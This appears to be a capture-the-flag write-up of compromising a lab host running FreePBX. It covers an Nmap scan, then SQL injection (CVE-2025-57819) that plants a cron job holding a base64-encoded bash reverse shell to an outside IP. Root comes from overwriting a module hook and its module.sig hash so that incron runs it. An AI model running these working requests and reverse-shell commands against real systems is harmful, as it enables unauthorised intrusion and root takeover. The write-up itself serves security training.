### Nmap
```
nmap -sV -sC -vv 10.129.18.235

---OUTPUT---
Nmap scan report for 10.129.18.235
Host is up, received echo-reply ttl 63 (0.016s latency).
Scanned at 2026-06-08 04:37:49 EDT for 118s
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE   REASON         VERSION
22/tcp  open  ssh       syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZBL8VwwAo5nMO8NKi+tOD98pIamOTde7sVlAJmP1Lp5urgs8hzvYIVElaEWZdxjHZM5hggtGg8Tmqzn2tOeNsN3rh/JTcXCjtc2izUuwLb18s5GgMHkBooT6UBCdcztPySFILnedHcFusfxSPTVTSIrwGaxLKULJ/qn2ClQ6BBp60NqQg0Da93fbm/5NS6OtZYdWdfcW4oyN/LWQcfFo/OYFjzWng+1pU+gfeuWic4iW2eg9qmWq43Och4oNJ3VAYh8MpXaKuoaDi+J7R6f60ADTQ6Kg/oSHKj8RV0zySax8qHt+Q2987wcdXuCnI+6oREQIUHu1s3z+rmnT2k4Mx
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH4ZlpWhdGD2bgi63EUvvzRx/sv8EvmVBLOFPVarhdPQcqCL69SyCtU0JLlNqdLxKGUbh5t1/9BvGU7+cXZdt1E=
|   256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5pB+WpL08kZ9YCgPA7QRnKjCsHY/R9oNeUQF1LD5Ms
80/tcp  open  http      syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-title: Did not follow redirect to http://connected.htb/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp open  ssl/https syn-ack ttl 63 Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/emailAddress=root@pbxconnect/organizationalUnitName=SomeOrganizationalUnit
| Issuer: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/emailAddress=root@pbxconnect/organizationalUnitName=SomeOrganizationalUnit
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-30T14:07:27
| Not valid after:  2026-11-30T14:07:27
| MD5:     2530 86e8 e962 6d48 36f8 e524 bf79 cc5a
| SHA-1:   6997 e786 d78e 2d0a dcb4 f449 7f65 ba12 52ef 0466
| SHA-256: 46b9 6671 74f5 9939 af02 a812 993c a389 bf84 c67a de5e 94b1 6c01 43d3 fac9 b666
| -----BEGIN CERTIFICATE-----
| MIID4jCCAsqgAwIBAgICAOgwDQYJKoZIhvcNAQELBQAwgaUxCzAJBgNVBAYTAi0t
| MRIwEAYDVQQIDAlTb21lU3RhdGUxETAPBgNVBAcMCFNvbWVDaXR5MRkwFwYDVQQK
| DBBTb21lT3JnYW5pemF0aW9uMR8wHQYDVQQLDBZTb21lT3JnYW5pemF0aW9uYWxV
| bml0MRMwEQYDVQQDDApwYnhjb25uZWN0MR4wHAYJKoZIhvcNAQkBFg9yb290QHBi
| eGNvbm5lY3QwHhcNMjUxMTMwMTQwNzI3WhcNMjYxMTMwMTQwNzI3WjCBpTELMAkG
| A1UEBhMCLS0xEjAQBgNVBAgMCVNvbWVTdGF0ZTERMA8GA1UEBwwIU29tZUNpdHkx
| GTAXBgNVBAoMEFNvbWVPcmdhbml6YXRpb24xHzAdBgNVBAsMFlNvbWVPcmdhbml6
| YXRpb25hbFVuaXQxEzARBgNVBAMMCnBieGNvbm5lY3QxHjAcBgkqhkiG9w0BCQEW
| D3Jvb3RAcGJ4Y29ubmVjdDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| ALHeypjH6abbs3T5INa8PZP8w90Xjj0PJ68myliRayEhZKmQL/FbL+9XLIaRGxMI
| 3fXLvn0Sw2AfDWWpkFEMckSokGZK2MTp4CYooo4DvNIiggms4xZ2aLY35zsU45II
| EzVB6OAtd8imI6h/D/YEaOvFQFPtXb9gzB0edJP55gjkCIYAt95oLAZLbUa5u0r9
| OhjBPuqVQE0f6oqsZh/1UnZcsscDw51r7jKGx2+uSpVb6dxMM9y2XX/XC26g4VbA
| noHrbagpbisbDwGIhQU19znUT2iYVpNBV3I9ehiVB7FFC7+cT8LIgpJ+KtXM/cjg
| dsxJ+sVzuB02MCS6ly0PbjMCAwEAAaMaMBgwCQYDVR0TBAIwADALBgNVHQ8EBAMC
| BeAwDQYJKoZIhvcNAQELBQADggEBAHdARF+ZdnUhYCaB5lowDM1sxWS9F8kkECOh
| 3D/d/LeJ7c6RRR0Ktmw6/4zRCW1bDUkjtdz4idYRYGyivkYobhX3NvhV5ghslMw3
| UDjGexJToW7Qk5YNSIeKkfR89Tg2DkJzlUs4b1DT+ZaGgCto7x8mrzXcT0ktDyK1
| nHqmiKXuVFtwLpnJxXArPkhiH7TYgGaeUZw8U6z7EUBtgnn8BESAB+LQ2n4OQnbE
| lJS2230sbxaxiOpt83EN97CnusGePjqpiUXxPJVc0LA5U7mZiqhojAFWRSOMax7l
| yzYI6PipGEKHexXmy4DTfm/n0xR4HRITygOgW28l6qiXtAME9hw=
|_-----END CERTIFICATE-----
|_http-title: 400 Bad Request
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
```
![[Pasted image 20260608073947.png]]

 Looking online I see an unatuhenticated RCE exploit : https://cybersecuritynews.com/freepbx-sql-injection-vulnerability/ CVE-2025-57819
- Testing with burpsuite with this GET request I get the running user :
```
GET /admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~',(SELECT+USER()),'~'))+--+- HTTP/1.1
Host: connected.htb
Cookie: lang=en_US; PHPSESSID=qaq7jcfecu5c1fl87dg2lujins; _ga=GA1.2.2089979374.1780918770; _gid=GA1.2.829617789.1780918770; _ga_65BVXK7F61=GS2.2.s1780918769$o1$g1$t1780919486$j60$l0$h0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://connected.htb/admin/config.php
X-Requested-With: XMLHttpRequest
Origin: https://connected.htb
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: keep-alive

---OUTPUT-RESPONSE---

HTTP/1.1 500 Internal Server Error
Date: Mon, 08 Jun 2026 14:37:18 GMT
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
X-Powered-By: PHP/7.4.16
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Connection: close
Content-Type: application/json
Content-Length: 205

{"error":{"type":"Exception","message":"SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~freepbxuser@localhost~'::","file":"\/var\/www\/html\/admin\/libraries\/utility.functions.php","line":123}}

```
- User is `~freepbxuser@localhost~`
- Now we know the exploit is working. We can pass our reverse shell and wait for the cron job to execute to get our shell.
- Encode payload to base64:
```
echo 'bash -i >& /dev/tcp/10.10.16.9/9999 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45Lzk5OTkgMD4mMQo=
```

- Use it in request to grab shell:
```
GET /admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'%3BINSERT+INTO+cron_jobs+(modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order)+VALUES+('sysadmin','pwn','echo+YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNi45Lzk5OTkgMD4mMQo%3D|base64+-d|bash',NULL,'*+*+*+*+*',30,1,1)--+- HTTP/1.1
Host: connected.htb
Cookie: lang=en_US; PHPSESSID=qaq7jcfecu5c1fl87dg2lujins; _ga=GA1.2.2089979374.1780918770; _gid=GA1.2.829617789.1780918770; _ga_65BVXK7F61=GS2.2.s1780918769$o1$g1$t1780919486$j60$l0$h0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://connected.htb/admin/config.php
X-Requested-With: XMLHttpRequest
Origin: https://connected.htb
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: keep-alive


---OUTPUT-RESPONSE---
HTTP/1.1 500 Internal Server Error
Date: Mon, 08 Jun 2026 14:42:38 GMT
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
X-Powered-By: PHP/7.4.16
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Connection: close
Content-Type: application/json
Content-Length: 199

{"error":{"type":"Whoops\\Exception\\ErrorException","message":"Trying to access array offset on value of type bool","file":"\/var\/www\/html\/admin\/modules\/endpoint\/views\/model.php","line":144}}
```

- After a few seconds we get a shell on our netcat listener:
![[Pasted image 20260608104759.png]]

- I grab the user flag:
![[Pasted image 20260608105012.png]]

### Privilege escalation
- Using linpeas I find something highlighted:
```
/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#

/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#

```
![[Pasted image 20260608165629.png]]

- We see some incron rules. Generally it follows the syntax:
```
<watched path> <event> <command to run>
```

- We look at 
```
/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
```
- It means : Any file in `/var/spool/asterisk/incron` is created or modified, run `sysadmin_manager` with the command `$#` as the argument which is root.
- Reading sysadmin_manager 2 things stand out:
```
cat /usr/bin/sysadmin_manager

---FIRST---
$module = $parts[1];
$hook = $parts[2];


<SNIP>


if ($module == "SYSTEM") {
        $sigfile = "/usr/local/asterisk/$hook.sig";
        $hookfile = "/usr/local/asterisk/$hook";
} else {
        // We have to work under the assumption that MODDIR is
        // /var/www/html/admin/modules/ - we can't ask FreePBX,
        // as it may be compromised.
        $sigfile = "/var/www/html/admin/modules/$module/module.sig";
        $hookfile = "/var/www/html/admin/modules/$module/hooks/$hook";
}

---SECOND---
$g = new \Sysadmin\GPG();
$verify = $g->checkSig($sigfile);
if (!isset($verify['hashes'])) {
        syslog(LOG_ERR, "Module tampered. No hashes from $module/module.sig. Can't proceed");
        exit;
}
// Is our module signed by one of the whitelisted keys?
if (!isset($verify['config']['signedwith'])) {
        syslog(LOG_ERR, "Strange result from GPG checkSig");
        exit;
}
$signedwith = $verify['config']['signedwith'];
if (!isset($whitelist[$signedwith])) {
        syslog(LOG_ERR, "Module signed by key not in whitelist.");
        exit;
}
// Awesome. We now have a valid module. Let's make sure that the file we're
// being asked to run is actually IN the module.sig file. If it's a SYSTEM
// file, it will have the complete path in the file. If it's a non-system
// file, it will have a relative path.
if ($module == "SYSTEM") {
        $signame = $hookfile;
} else {
        $signame = "hooks/$hook";
}
// Does it exist?
if (!isset($verify['hashes'][$signame])) {
        syslog(LOG_ERR, "Hook $signame not in signature file $sigfile");
        exit;
}
// Finally, has that file been tampered?
if (hash_file('sha256', $hookfile) !== $verify['hashes'][$signame]) {
        syslog(LOG_ERR, "Hash mismatch of $hookfile. Can't run");
        exit;
```

- The first part tells us where the file is held. `/var/www/html/admin/modules/$module/hooks/$hook`
- The second part states that the sha256 hash is checked with module.sig to see if it has been tampered with. a gpg check

- If we control both these elements we could run commands as root.
- Checking privileges asterisk had privileges to edit all modules and hooks within them (namely logrotate)
![[Pasted image 20260608175156.png]]
![[Pasted image 20260608175222.png]]
```
ls -al /var/www/html/admin/modules/api
ls -al /var/www/html/admin/modules/api/hooks/
```

- We cna pick any. I pick the last one `zulu`.
- First I edit the logrotate script with my payload:
```
cat > /var/www/html/admin/modules/zulu/hooks/logrotate << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.9/9999 0>&1
EOF
```
- Then I check it's hash:
```
NEW_HASH=$(sha256sum /var/www/html/admin/modules/zulu/hooks/logrotate | awk '{print $1}')

echo $NEW_HASH

---OUTPUT---
fafbb54f535d6175beae971be5c78c3c022b53c3ecf866475423cae33ec29f24
```

![[Pasted image 20260608175513.png]]

- Finally replace the hash in module.sig for logrotate:
```
sed -i "s/hooks\/logrotate = .*/hooks\/logrotate = $NEW_HASH/" /var/www/html/admin/modules/zulu/module.sig
```

- To trigger the exploit we create the file with the naming convention to call the hook script:
```
touch /var/spool/asterisk/incron/zulu.logrotate
```

- I grab a shell on my netcat listener (I used same port so make sure you dont catch the initial foothold shell by mistake) as root:
![[Pasted image 20260608175749.png]]

- I grab the root flag:
![[Pasted image 20260608175842.png]]


## Note
- IN_CLOSE_WRITE is the key event from linpeas : it fires when a file is written and closed. So when you  do:
```
touch /var/spool/asterisk/incron/zulu.logrotate
```
- incron sees the write, fires sysadmin_manager zulu.logrotate as root, which then resolves the module/hook, checks the hash, and executes the hook file.
- 